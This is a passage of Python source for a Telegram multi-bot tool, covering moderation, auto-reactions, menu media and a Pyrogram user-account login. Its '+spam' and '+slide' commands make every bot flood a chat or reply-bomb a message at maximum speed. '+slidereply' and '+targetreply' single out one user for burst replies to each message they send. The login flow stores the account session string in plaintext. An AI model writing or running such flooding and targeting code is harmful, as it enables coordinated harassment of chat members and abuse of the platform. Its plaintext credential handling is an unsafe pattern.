        return await update.message.reply_text("Usage: /restrict (reply to a message)")

    if is_admin(target.id):
        return await update.message.reply_text("❌ Cannot restrict an admin.")

    try:
        await context.bot.restrict_chat_member(
            update.effective_chat.id,
            target.id,
            permissions=_NO_PERMS,
        )
        name = target.first_name or str(target.id)
        await update.message.reply_text(
            f"🔒 💦 @{target.username or name} restricted\n"
            f"All permissions removed. /unrestrict to restore."
        )
    except Forbidden:
        await update.message.reply_text("❌ Bot lacks restrict_members permission.")
    except BadRequest as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def unrestrict_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /unrestrict — Reply to a restricted user → restore all normal permissions.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return

    target = None
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target = update.message.reply_to_message.from_user
    elif context.args:
        try:
            target_id = int(context.args[0])
            member = await context.bot.get_chat_member(update.effective_chat.id, target_id)
            target = member.user
        except Exception:
            return await update.message.reply_text("Usage: /unrestrict (reply to user)")

    if not target:
        return await update.message.reply_text("Usage: /unrestrict (reply to a message)")

    try:
        await context.bot.restrict_chat_member(
            update.effective_chat.id,
            target.id,
            permissions=_ALL_PERMS,
        )
        name = target.first_name or str(target.id)
        await update.message.reply_text(
            f"🔓 💦 @{target.username or name} unrestricted\n"
            f"All permissions restored."
        )
    except Forbidden:
        await update.message.reply_text("❌ Bot lacks restrict_members permission.")
    except BadRequest as e:
        await update.message.reply_text(f"❌ Error: {e}")


_REACT_RANDOM = [
    "👍","❤️","🔥","🥰","👏","😁","🤔","🤯","😱","🤩",
    "🎉","💯","🦄","⚡","🌚","💫","🏆","😎","👾","🫡",
    "🎃","🎄","🎆","✨","🍓","🍾","💋","🙏","👀","🫶",
]
_REACT_HEART = [
    "❤️","🧡","💛","💚","💙","💜","🖤","🤍","🤎","❤️‍🔥",
    "💝","💖","💗","💓","💞","💕","💘","💟","🫀","🥰",
]
_REACT_BOOM = [
    "🔥","⚡","💥","🤯","😱","🏆","👊","💣","🤩","🚀",
    "🎯","💫","⭐","🌟","😈","👑","🦁","🐉","🔱","⚔️",
]


async def _do_react_one(bot, chat_id: int, msg_id: int, emoji: str):
    # Older python-telegram-bot versions do not provide reactions.
    if ReactionTypeEmoji is None or not hasattr(bot, "set_message_reaction"):
        return
    try:
        await bot.set_message_reaction(
            chat_id,
            msg_id,
            reaction=[ReactionTypeEmoji(emoji=emoji)],
            is_big=False,
        )
    except Exception:
        pass

async def _do_react(bots: list, chat_id: int, msg_id: int, style: str):
    if style == "heart":
        emoji = random.choice(_REACT_HEART)
    elif style == "boom":
        emoji = random.choice(_REACT_BOOM)
    elif style == "custom":
        emoji = custom_react_emojis.get(chat_id, "💦")
    else:
        emoji = random.choice(_REACT_RANDOM)
    await asyncio.gather(
        *[_do_react_one(b, chat_id, msg_id, emoji) for b in bots],
        return_exceptions=True,
    )


async def autoreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +autoreact — Toggle: react to every incoming message with a random emoji.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    if autoreact_chats.get(chat_id) == "random":
        autoreact_chats.pop(chat_id, None)
        await update.message.reply_text("😶 💦 𝐀𝐔𝐓𝐎𝐑𝐄𝐀𝐂𝐓 𝐎𝐅𝐅")
    else:
        autoreact_chats[chat_id] = "random"
        await update.message.reply_text(
            "😂 💦 𝐀𝐔𝐓𝐎𝐑𝐄𝐀𝐂𝐓 𝐎𝐍 — Reacting to every message\n"
            "+autoreact again to off · /stopreact to stop"
        )


async def heartreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +heartreact — Toggle: react to every message with a heart emoji.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    if autoreact_chats.get(chat_id) == "heart":
        autoreact_chats.pop(chat_id, None)
        await update.message.reply_text("😶 💦 𝐇𝐄𝐀𝐑𝐓𝐑𝐄𝐀𝐂𝐓 𝐎𝐅𝐅")
    else:
        autoreact_chats[chat_id] = "heart"
        await update.message.reply_text(
            "❤️ 💦 𝐇𝐄𝐀𝐑𝐓𝐑𝐄𝐀𝐂𝐓 𝐎𝐍 — Hearts on every message\n"
            "+heartreact again to off · /stopreact to stop"
        )


async def boomreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +boomreact — Toggle: react to every message with fire/hype emojis.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    if autoreact_chats.get(chat_id) == "boom":
        autoreact_chats.pop(chat_id, None)
        await update.message.reply_text("😶 💦 𝐁𝐎𝐎𝐌𝐑𝐄𝐀𝐂𝐓 𝐎𝐅𝐅")
    else:
        autoreact_chats[chat_id] = "boom"
        await update.message.reply_text(
            "🔥 💦 𝐁𝐎𝐎𝐌𝐑𝐄𝐀𝐂𝐓 𝐎𝐍 — Fire emojis on every message\n"
            "+boomreact again to off · /stopreact to stop"
        )


async def stopreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    if chat_id in autoreact_chats:
        autoreact_chats.pop(chat_id)
        custom_react_emojis.pop(chat_id, None)
        await update.message.reply_text("😶 💦 𝐀𝐔𝐓𝐎 𝐑𝐄𝐀𝐂𝐓 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")
    else:
        await update.message.reply_text("No auto react active here.")


async def customreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +customreact <emoji>
    React to every incoming message with your chosen emoji.
    +customreact (no emoji) → off.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    chat_id = update.effective_chat.id
    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+customreact", "💦customreact", "/customreact"), context)

    if not base:
        if autoreact_chats.get(chat_id) == "custom":
            autoreact_chats.pop(chat_id)
            custom_react_emojis.pop(chat_id, None)
            return await update.message.reply_text("😶 💦 𝐂𝐔𝐒𝐓𝐎𝐌 𝐑𝐄𝐀𝐂𝐓 𝐎𝐅𝐅")
        return await update.message.reply_text("Usage: +customreact <emoji>  e.g. +customreact 🔥")

    emoji_char = base.split()[0]
    custom_react_emojis[chat_id] = emoji_char
    autoreact_chats[chat_id] = "custom"
    await update.message.reply_text(
        f"✨ 💦 𝐂𝐔𝐒𝐓𝐎𝐌 𝐑𝐄𝐀𝐂𝐓 𝐎𝐍  →  {emoji_char}\n"
        f"Every incoming msg gets reacted with {emoji_char}\n"
        f"+customreact or /stopreact to turn off"
    )


async def setmenuphoto_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /setmenuphoto — Reply to a photo (or send a photo with this caption).
    Saves the file_id so every /start and /help sends that photo with the menu.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message:
        return

    ref = update.message.reply_to_message or update.message

    photo    = ref.photo[-1]         if ref.photo    else None
    doc_img  = (
        ref.document if ref.document and ref.document.mime_type
        and ref.document.mime_type.startswith("image/") else None
    )

    if not photo and not doc_img:
        return await update.message.reply_text("❌ Reply to a photo or send a photo with /setmenuphoto")

    _menu_media.clear()
    if photo:
        _menu_media["photo_id"] = photo.file_id
    else:
        _menu_media["document_id"] = doc_img.file_id
    save_menu_media(_menu_media)
    await update.message.reply_text("🖼 𝐌𝐄𝐍𝐔 𝐏𝐇𝐎𝐓𝐎 𝐒𝐄𝐓 ✅\n/start or /help will now send this photo.")


async def setmenuvideo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /setmenuvideo — Reply to a video (or send a video with this caption).
    Saves the file_id so every /start and /help sends that video with the menu.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message:
        return

    ref = update.message.reply_to_message or update.message

    video  = ref.video     if ref.video     else None
    anim   = ref.animation if ref.animation else None
    doc_vid = (
        ref.document if ref.document and ref.document.mime_type
        and ref.document.mime_type.startswith("video/") else None
    )

    if not video and not anim and not doc_vid:
        return await update.message.reply_text("❌ Reply to a video/GIF or send one with /setmenuvideo")

    _menu_media.clear()
    if video:
        _menu_media["video_id"] = video.file_id
    elif anim:
        _menu_media["animation_id"] = anim.file_id
    else:
        _menu_media["document_id"] = doc_vid.file_id
    save_menu_media(_menu_media)
    await update.message.reply_text("🎥 𝐌𝐄𝐍𝐔 𝐕𝐈𝐃𝐄𝐎 𝐒𝐄𝐓 ✅\n/start or /help will now send this video.")


async def clearmenu_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /clearmenu — Remove any attached photo/video from the menu.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message:
        return

    _menu_media.clear()
    save_menu_media(_menu_media)
    await update.message.reply_text("🗑 💦 𝐌𝐄𝐍𝐔 𝐌𝐄𝐃𝐈𝐀 𝐂𝐋𝐄𝐀𝐑𝐄𝐃 — Menu will send text only.")


SLIDE_TEXTS = [
    "💦", "🌊💦", "💦🌊💦", "⚡💦⚡",
    "💦 ִֶָ𓂃 ࣪˖", "🔥💦🔥", "👀💦",
    "💦💦💦", "🌊🌊🌊", "⚡⚡⚡",
    "🫧💦🫧", "💧💧💧", "💦😈💦",
    "🌊⚡🌊", "💦👑💦", "🔥🌊🔥",
]

async def _slide_reply_burst(bot, chat_id: int, message_id: int, count: int = 6):
    """Fire `count` rapid replies to a specific message using one bot."""
    for i in range(count):
        text = random.choice(SLIDE_TEXTS)
        try:
            await bot.send_message(
                chat_id,
                text,
                reply_to_message_id=message_id,
            )
        except (RetryAfter, Forbidden, BadRequest):
            break
        except Exception:
            pass
        await asyncio.sleep(0)


async def slidereply_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +slidereply — Reply to a user's message to set them as the slide-reply target.
    Every message they send after that gets a rapid burst of replies from all bots.
    +slidereply again (while active) toggles it off.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    chat_id = update.effective_chat.id

    target_user = None
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_user = update.message.reply_to_message.from_user
    elif context.args:
        try:
            uid_arg = int(context.args[0])
            slide_reply_targets[chat_id] = uid_arg
            await update.message.reply_text(
                f"💬 💦𝐒𝐋𝐈𝐃𝐄𝐑𝐄𝐏𝐋𝐘 𝐎𝐍\n"
                f"🎯 Target UID: {uid_arg}\n"
                f"Every msg from them → superfast burst replies\n"
                f"+slidereply or /stopslidereply to stop"
            )
            return
        except ValueError:
            pass

    if target_user is None:
        if chat_id in slide_reply_targets:
            slide_reply_targets.pop(chat_id)
            return await update.message.reply_text("💬 💦 𝐒𝐋𝐈𝐃𝐄𝐑𝐄𝐏𝐋𝐘 𝐎𝐅𝐅")
        return await update.message.reply_text("Usage: +slidereply (reply to target user's message)")

    if is_admin(target_user.id):
        return await update.message.reply_text("❌ Cannot target an admin.")

    if slide_reply_targets.get(chat_id) == target_user.id:
        slide_reply_targets.pop(chat_id)
        return await update.message.reply_text(
            f"💬 💦 𝐒𝐋𝐈𝐃𝐄𝐑𝐄𝐏𝐋𝐘 𝐎𝐅𝐅 — @{target_user.username or target_user.first_name}"
        )

    slide_reply_targets[chat_id] = target_user.id
    name = target_user.username or target_user.first_name or str(target_user.id)
    await update.message.reply_text(
        f"💬 💦𝐒𝐋𝐈𝐃𝐄𝐑𝐄𝐏𝐋𝐘 𝐎𝐍\n"
        f"🎯 Target: @{name}\n"
        f"Every msg from them → superfast burst replies\n"
        f"+slidereply (reply again) or /stopslidereply to stop"
    )


async def stopslidereply_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    if chat_id in slide_reply_targets:
        slide_reply_targets.pop(chat_id)
        await update.message.reply_text("💬 💦 𝐒𝐋𝐈𝐃𝐄𝐑𝐄𝐏𝐋𝐘 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")
    else:
        await update.message.reply_text("No slidereply active here.")


_SLIDE_SYMS = [
    "꧁", "꧂", "⟡", "✦", "◈", "✧", "⊹", "✶", "⋆", "꩜",
    "⌬", "◉", "⧖", "⬡", "⬢", "⍟", "⎔", "⏣", "☽", "☾",
    "⚡", "🔥", "💫", "⚜", "🌟", "💠", "🔮", "🌀", "👑", "💎",
    "⚔", "🛡", "🎯", "🎭", "🎨", "🌸", "🦋", "🌊", "🎪", "🎬",
    "꫁", "ꫂ", "⟣", "⟢", "⟤", "⟥", "⊛", "⊜", "⍣", "⍤",
]

async def plus_slide(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +slide <text>
    ─────────────────────────────────────────────────────────
    SLIDE SPAM — reply-bomb with all bots + modern symbols.

    • Reply to any message → all bots reply to THAT message
    • Each bot picks a random modern symbol pair each time
    • Fires as fast as possible across all 10 bots in parallel
    • /stop stops it like any other task

    Example:
      +slide gn         (while replying to a user's message)
    ─────────────────────────────────────────────────────────
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not _is_primary_bot(context):
        return
    if not update.effective_chat or not update.message:
        return
    if not update.message.reply_to_message:
        return await update.message.reply_text(
            "↩️ Reply to a message, then use +slide <text>"
        )

    raw_text = (update.message.text or "").strip()
    if raw_text.lower().startswith("+slide"):
        base = raw_text[6:].strip()
    else:
        base = " ".join(context.args) if context.args else ""
    if not base:
        return await update.message.reply_text("Usage: +slide <text>")

    chat_id       = update.effective_chat.id
    target_msg_id = update.message.reply_to_message.message_id
    bots          = [b for b in all_bot_instances if b is not None] or [context.bot]

    async def _bot_slide_worker(bot, stop_event: asyncio.Event):
        while not stop_event.is_set():
            sym1 = random.choice(_SLIDE_SYMS)
            sym2 = random.choice(_SLIDE_SYMS)
            text = f"{sym1} {base} {sym2}"
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    reply_to_message_id=target_msg_id,
                )
            except RetryAfter as e:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=float(e.retry_after))
                except asyncio.TimeoutError:
                    pass
            except (BadRequest, Forbidden, TimedOut, NetworkError):
                pass
            except Exception:
                pass
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=0.05)
            except asyncio.TimeoutError:
                pass

    async def slide_loop(stop_event: asyncio.Event):
        workers = [
            asyncio.create_task(_bot_slide_worker(bot, stop_event))
            for bot in bots
        ]
        try:
            await asyncio.gather(*workers, return_exceptions=True)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()

    await task_controller.start_task(chat_id, "spam", slide_loop)
    await update.message.reply_text(
        f"⚡ 𝐒𝐋𝐈𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐄 ({len(bots)} bots)\n"
        f"💬 Replying with modern symbols at max speed | Stop: /stop"
    )


async def spam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +spam <text>
    All bots spam-send the text to the current chat as fast as possible.
    /stopspam to stop.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+spam", "💦spam", "/spam"), context)
    if not base:
        return await update.message.reply_text("Usage: +spam <text>")

    chat_id = update.effective_chat.id
    bots = [b for b in all_bot_instances if b is not None] or [context.bot]

    async def _bot_spam_worker(bot, stop_event: asyncio.Event):
        while not stop_event.is_set():
            try:
                await bot.send_message(chat_id=chat_id, text=base)
            except RetryAfter as e:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=float(e.retry_after))
                except asyncio.TimeoutError:
                    pass
            except (BadRequest, Forbidden):
                break
            except (TimedOut, NetworkError):
                pass
            except Exception:
                pass
            try:
                await asyncio.wait_for(stop_event.wait(), timeout=0.05)
            except asyncio.TimeoutError:
                pass

    async def spam_loop(stop_event: asyncio.Event):
        workers = [asyncio.create_task(_bot_spam_worker(bot, stop_event)) for bot in bots]
        try:
            await asyncio.gather(*workers, return_exceptions=True)
        finally:
            for w in workers:
                if not w.done():
                    w.cancel()

    await task_controller.start_task(chat_id, "spam", spam_loop)
    await update.message.reply_text(
        f"💬 💦𝐒𝐏𝐀𝐌 𝐀𝐂𝐓𝐈𝐕𝐄 ({len(bots)} bots)\n"
        f"📨 Text: {base[:40]}\n"
        f"Stop: /stopspam"
    )


async def stopspam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or not update.message:
        return
    stopped = await task_controller.stop_task(update.effective_chat.id, "spam")
    if stopped:
        await update.message.reply_text("🛑 💦 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")
    else:
        await update.message.reply_text("No spam running here.")


async def autoreply_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +autoreply <text>
    Every incoming message in this chat gets an automatic reply with <text>.
    +autoreply (no text) or /stopautoreply to turn off.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+autoreply", "💦autoreply", "/autoreply"), context)
    chat_id = update.effective_chat.id

    if not base:
        if chat_id in autoreply_chats:
            autoreply_chats.pop(chat_id)
            return await update.message.reply_text("🔇 💦 𝐀𝐔𝐓𝐎𝐑𝐄𝐏𝐋𝐘 𝐎𝐅𝐅")
        return await update.message.reply_text("Usage: +autoreply <text>")

    autoreply_chats[chat_id] = base
    await update.message.reply_text(
        f"💬 💦 𝐀𝐔𝐓𝐎𝐑𝐄𝐏𝐋𝐘 𝐎𝐍\n"
        f"📩 Replying to every msg with: {base[:40]}\n"
        f"+autoreply or /stopautoreply to stop"
    )


async def stopautoreply_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    if chat_id in autoreply_chats:
        autoreply_chats.pop(chat_id)
        await update.message.reply_text("🔇 💦 𝐀𝐔𝐓𝐎𝐑𝐄𝐏𝐋𝐘 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")
    else:
        await update.message.reply_text("No autoreply active here.")


async def targetreply_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    +targetreply <text>  (reply to target user's message)
    Every message from that user gets an automatic reply with <text>.
    +targetreply on the same user (no text) or /stoptargetreply to stop.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message:
        return
    if not _is_primary_bot(context):
        return

    raw = (update.message.text or "").strip()
    base = _extract_base(raw, ("+targetreply", "💦targetreply", "/targetreply"), context)
    chat_id = update.effective_chat.id

    target_user = None
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_user = update.message.reply_to_message.from_user

    if not target_user:
        if chat_id in targetreply_chats:
            targetreply_chats.pop(chat_id)
            return await update.message.reply_text("🔇 💦 𝐓𝐀𝐑𝐆𝐄𝐓𝐑𝐄𝐏𝐋𝐘 𝐎𝐅𝐅")
        return await update.message.reply_text(
            "Usage: +targetreply <text> (reply to the target user's message)"
        )

    if is_admin(target_user.id):
        return await update.message.reply_text("❌ Cannot target an admin.")

    if not base:
        if targetreply_chats.get(chat_id, {}).get("uid") == target_user.id:
            targetreply_chats.pop(chat_id)
            return await update.message.reply_text("🔇 💦 𝐓𝐀𝐑𝐆𝐄𝐓𝐑𝐄𝐏𝐋𝐘 𝐎𝐅𝐅")
        return await update.message.reply_text(
            "Usage: +targetreply <text> (reply to the target user's message)"
        )

    name = target_user.username or target_user.first_name or str(target_user.id)
    targetreply_chats[chat_id] = {"uid": target_user.id, "text": base}
    await update.message.reply_text(
        f"🎯 💦 𝐓𝐀𝐑𝐆𝐄𝐓𝐑𝐄𝐏𝐋𝐘 𝐎𝐍\n"
        f"👤 Target: @{name}\n"
        f"📩 Every msg from them → reply: {base[:40]}\n"
        f"+targetreply or /stoptargetreply to stop"
    )


async def stoptargetreply_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_chat or not update.message:
        return
    chat_id = update.effective_chat.id
    if chat_id in targetreply_chats:
        targetreply_chats.pop(chat_id)
        await update.message.reply_text("🔇 💦 𝐓𝐀𝐑𝐆𝐄𝐓𝐑𝐄𝐏𝐋𝐘 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")
    else:
        await update.message.reply_text("No targetreply active here.")


try:
    from pyrogram import Client as PyroClient
    from pyrogram.errors import (
        SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
        FloodWait, UserAlreadyParticipant, PeerFlood,
        UserPrivacyRestricted, ChatAdminRequired, UserNotParticipant,
    )
    from pyrogram.types import ChatPrivileges
    _PYRO_AVAILABLE = True
except ImportError:
    _PYRO_AVAILABLE = False

USER_API_FILE = "user_api.json"

def _load_user_api() -> Dict:
    try:
        if os.path.exists(USER_API_FILE):
            with open(USER_API_FILE) as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def _save_user_api(data: Dict):
    try:
        with open(USER_API_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

_user_api: Dict = _load_user_api()
_pyro_client: Optional[Any] = None
_pyro_login_state: Dict = {}


async def _get_pyro():
    global _pyro_client
    if _pyro_client and _pyro_client.is_connected:
        return _pyro_client
    return None


async def _connect_pyro_from_saved() -> bool:
    global _pyro_client
    if not _PYRO_AVAILABLE:
        return False
    api_id    = _user_api.get("api_id")
    api_hash  = _user_api.get("api_hash")
    session   = _user_api.get("session_string")
    if not (api_id and api_hash and session):
        return False
    try:
        client = PyroClient(
            "nc_user",
            api_id=int(api_id),
            api_hash=api_hash,
            session_string=session,
            in_memory=True,
        )
        await client.start()
        _pyro_client = client
        me = await client.get_me()
        print(f"👤 User account: @{me.username or me.first_name} connected")
        return True
    except Exception as e:
        print(f"⚠️  User account auto-connect failed: {e}")
        return False


async def setapi_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /setapi <api_id> <api_hash>
    Save Telegram API credentials (get from https://my.telegram.org).
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message or not _is_primary_bot(context):
        return
    if not _PYRO_AVAILABLE:
        return await update.message.reply_text("❌ Pyrogram not installed.")
    args = context.args or []
    if len(args) < 2:
        return await update.message.reply_text(
            "Usage: /setapi <api_id> <api_hash>\n"
            "Get yours → https://my.telegram.org"
        )
    try:
        int(args[0])
    except ValueError:
        return await update.message.reply_text("❌ api_id must be a number.")
    _user_api["api_id"]   = int(args[0])
    _user_api["api_hash"] = args[1]
    _save_user_api(_user_api)
    await update.message.reply_text(
        f"✅ API credentials saved!\n"
        f"Next step: /userlogin <phone number>"
    )


async def userlogin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /userlogin +91XXXXXXXXXX
    Start login — Telegram will send you an OTP.
    """
    global _pyro_client
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message or not _is_primary_bot(context):
        return
    if not _PYRO_AVAILABLE:
        return await update.message.reply_text("❌ Pyrogram not installed.")
    api_id   = _user_api.get("api_id")
    api_hash = _user_api.get("api_hash")
    if not (api_id and api_hash):
        return await update.message.reply_text(
            "❌ Set API first: /setapi <api_id> <api_hash>"
        )
    args = context.args or []
    if not args:
        return await update.message.reply_text(
            "Usage: /userlogin <phone>  e.g. /userlogin +919876543210"
        )
    phone = args[0]
    _user_api["phone"] = phone
    _save_user_api(_user_api)
    try:
        client = PyroClient(
            "nc_login_tmp",
            api_id=int(api_id),
            api_hash=api_hash,
            in_memory=True,
        )
        await client.connect()
        sent = await client.send_code(phone)
        _pyro_login_state["phone"]  = phone
        _pyro_login_state["hash"]   = sent.phone_code_hash
        _pyro_login_state["client"] = client
        await update.message.reply_text(
            f"📲 OTP sent to {phone}!\n"
            f"Enter it with: /userotp <code>\n"
            f"Example: /userotp 12345"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send OTP: {e}")


async def userotp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /userotp <code>
    Complete login with the OTP you received.
    """
    global _pyro_client
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message or not _is_primary_bot(context):
        return
    if not _PYRO_AVAILABLE:
        return await update.message.reply_text("❌ Pyrogram not installed.")
    args = context.args or []
    if not args:
        return await update.message.reply_text("Usage: /userotp <code>")
    code              = args[0].strip()
    client            = _pyro_login_state.get("client")
    phone             = _pyro_login_state.get("phone")
    phone_code_hash   = _pyro_login_state.get("hash")
    if not (client and phone and phone_code_hash):
        return await update.message.reply_text(
            "❌ No login in progress. Use /userlogin <phone> first."
        )
    try:
        await client.sign_in(phone, phone_code_hash, code)
        session_str = await client.export_session_string()
        _user_api["session_string"] = session_str
        _save_user_api(_user_api)
        real_client = PyroClient(
            "nc_user",
            api_id=int(_user_api["api_id"]),
            api_hash=_user_api["api_hash"],
            session_string=session_str,
            in_memory=True,
        )
        await real_client.start()
        _pyro_client = real_client
        me = await real_client.get_me()
        _pyro_login_state.clear()
        try:
            await client.disconnect()
        except Exception:
            pass
        await update.message.reply_text(
            f"✅ 👤 Logged in as: {me.first_name} (@{me.username or 'N/A'})\n"
            f"User account ready! Check status: /userstatus"
        )
    except SessionPasswordNeeded:
        await update.message.reply_text(
            "🔐 2FA enabled! Send password: /user2fa <password>"
        )
    except (PhoneCodeInvalid, PhoneCodeExpired):
        await update.message.reply_text(
            "❌ Wrong or expired OTP. Try /userlogin again."
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Login failed: {e}")


async def user2fa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /user2fa <password>
    Enter your 2FA password to complete login.
    """
    global _pyro_client
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message or not _is_primary_bot(context):
        return
    if not _PYRO_AVAILABLE:
        return await update.message.reply_text("❌ Pyrogram not installed.")
    args = context.args or []
    if not args:
        return await update.message.reply_text("Usage: /user2fa <password>")
    password = " ".join(args)
    client   = _pyro_login_state.get("client")
    if not client:
        return await update.message.reply_text(
            "❌ No login in progress. Use /userlogin <phone> first."
        )
    try:
        await client.check_password(password)
        session_str = await client.export_session_string()
        _user_api["session_string"] = session_str
        _save_user_api(_user_api)
        real_client = PyroClient(
            "nc_user",
            api_id=int(_user_api["api_id"]),
            api_hash=_user_api["api_hash"],
            session_string=session_str,
            in_memory=True,
        )
        await real_client.start()
        _pyro_client = real_client
        me = await real_client.get_me()
        _pyro_login_state.clear()
        try:
            await client.disconnect()
        except Exception:
            pass
        await update.message.reply_text(
            f"✅ 👤 Logged in as: {me.first_name} (@{me.username or 'N/A'})\n"
            f"User account ready!"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 2FA failed: {e}")


async def userlogout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _pyro_client
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
        return await update.message.reply_text("❌ No user account connected.")
    try:
        await client.log_out()
    except Exception:
        pass
    _pyro_client = None
    _user_api.pop("session_string", None)
    _save_user_api(_user_api)
    await update.message.reply_text("👋 User account logged out.")


async def userstatus_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.message:
        return
    client = await _get_pyro()
    if not client:
        status = (
            "📊 User Account Status:\n"
            f"🔑 API set: {'✅' if _user_api.get('api_id') else '❌'}\n"
            f"📱 Session saved: {'✅' if _user_api.get('session_string') else '❌'}\n"
            f"🔴 Client: NOT connected\n\n"
            f"Setup: /setapi → /userlogin → /userotp"
        )
    else:
        try:
            me = await client.get_me()
            status = (
                f"📊 User Account Status:\n"
                f"✅ Connected as: {me.first_name}\n"
                f"👤 Username: @{me.username or 'N/A'}\n"
                f"📱 Phone: {me.phone_number or 'N/A'}\n"
                f"🆔 ID: `{me.id}`"
            )
        except Exception as e:
            status = f"⚠️ Connected but error getting info: {e}"
    await update.message.reply_text(status, parse_mode="Markdown")


async def addbot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /addbot @username [...]  or reply to a bot message → adds that bot.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
        return await update.message.reply_text(
            "❌ User account not connected.\nSetup: /setapi → /userlogin → /userotp"
        )
    chat_id = update.effective_chat.id
    usernames: List[str] = []
    if context.args:
        usernames = [u.lstrip("@") for u in context.args]
    elif (update.message.reply_to_message
          and update.message.reply_to_message.from_user
          and update.message.reply_to_message.from_user.username):
        usernames = [update.message.reply_to_message.from_user.username]
    if not usernames:
        return await update.message.reply_text(
            "Usage: /addbot @username  or reply to a bot message"
        )
    results: List[str] = []
    for uname in usernames:
        try:
            await client.add_chat_members(chat_id, uname)
            results.append(f"✅ @{uname} added")
        except UserAlreadyParticipant:
            results.append(f"ℹ️ @{uname} already in group")
        except Exception as e:
            results.append(f"❌ @{uname}: {type(e).__name__}")
    await update.message.reply_text("👥 Add Bot:\n" + "\n".join(results))


async def addallbots_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /addallbots — Add ALL configured bots to this group via user account.
    """
    if not update.effective_user or not is_admin(update.effective_user.id):
        return
    if not update.effective_chat or not update.message or not _is_primary_bot(context):
        return
    client = await _get_pyro()
    if not client:
